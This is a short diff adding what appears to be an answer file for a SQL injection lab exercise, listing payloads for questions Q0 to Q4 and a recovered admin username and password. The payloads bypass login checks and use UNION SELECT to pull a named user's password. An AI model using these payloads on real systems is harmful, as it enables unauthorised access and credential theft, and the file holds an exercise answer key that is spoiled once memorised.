@@ -1,0 +1,5 @@
+Q0 => password => ' or '1'='1
+Q1 => password => ' or username='admin
+Q2 => username => admin') -- 
+Q3 => username => ' union select password from q3users where username='norrathep'; -- 
+Q4 => username:password => admin:PSUPhuketCampusNorrathep
